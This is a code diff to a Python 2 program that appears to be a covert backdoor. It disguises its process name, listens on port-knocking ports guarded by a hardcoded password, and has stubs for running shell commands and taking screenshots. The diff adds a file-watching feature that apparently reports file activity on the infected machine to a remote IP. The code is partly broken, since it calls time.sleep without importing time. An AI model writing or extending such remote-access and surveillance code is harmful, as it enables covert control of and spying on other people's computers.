@@ -2,11 +2,15 @@
 
 import logging, setproctitle, triplesec, encryption, configfile, helpers
 from ctypes import cdll, byref, create_string_buffer
+from watchdog.observers import Observer
+from fileWatch import FileWatch
 
 state = 0
 ports = [1000, 2000, 3000]
 password = 'abcdefyoyo'
 maxPort = 65535
+observer = Observer()
+watch= ''
 # unauthClients = {}
 # authedClients = {}
 
@@ -59,11 +63,18 @@ def shellCommand(packet, command):
                        , configfile.protocol
                        , ip)
 
-def watchAdd():
-    print "watchAdd"
+def watchAdd(path, ip):
+    watch = observer.schedule(FileWatch(ip), path)
+    observer.start()
 
-def watchRemove():
-    print "watchRemove"
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        observer.stop()
+
+def watchRemove(watch):
+    observer.unschedule(watch)
 
 def screenshot():
     print "screenshot"
